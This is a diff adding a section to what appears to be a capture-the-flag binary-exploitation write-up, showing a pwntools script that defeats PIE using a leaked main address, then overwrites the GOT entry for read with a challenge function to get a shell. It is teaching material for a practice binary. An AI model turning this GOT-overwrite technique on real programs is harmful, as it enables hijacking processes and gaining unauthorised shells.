@@ -177,3 +177,38 @@ io.sendlineafter('value?\n', str(win_addr))
 #print result
 print(io.recvall())
 ```
+
+### Bonus in case of PIE enabled
+If the PIE it's enabled we need to first find the actual main addres from where we should start to see the addresses of the functions.
+To do that we can follow the following example:
+```python
+from pwn import *
+
+#as done before
+context.binary = './challenge'
+
+#as done before
+io = process(context.binary.path)
+
+# Receive the address of main (the real address in memory)
+main = io.unpack()
+
+#as done before
+elf = context.binary
+
+#here it's recalculating the base address based on the real current position of the main in memory
+elf.address = main - elf.symbols['main']
+
+#as done before
+where = elf.got['read']
+
+#as done before
+what = elf.symbols['oh_look_useful']
+
+#here we are sending the payload using .pack() instead of sendline or sendlineafter, because in this case we needed to send the string rappresentation of the int on the read() function. TLDR: it accepts values with a size of 8 bytes, but the format it's not specified, so we have to send a strange int in a str format.
+io.pack(where)
+io.pack(what)
+
+# Enjoy the shell
+io.interactive()
+```
